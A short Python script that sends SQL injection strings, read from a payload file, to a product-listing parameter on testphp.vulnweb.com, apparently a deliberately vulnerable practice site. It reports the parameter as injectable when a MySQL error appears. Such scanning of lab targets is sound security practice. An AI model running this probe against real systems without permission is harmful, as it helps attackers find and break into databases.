import requests

domain = "http://testphp.vulnweb.com/listproducts.php?cat="
mysql_attacks = []

with open('MSSQL.txt', 'r') as file:
  for line in file:
    attack = line[:-1]
    mysql_attacks.append(attack)

for attack in mysql_attacks:
  print(f"Testing... {domain}{attack}")
  response = requests.get(domain+attack)
  if "mysql" in response.text.lower():
    print("Injectable MySQL detected")
    print(f"Attack string: {attack}")

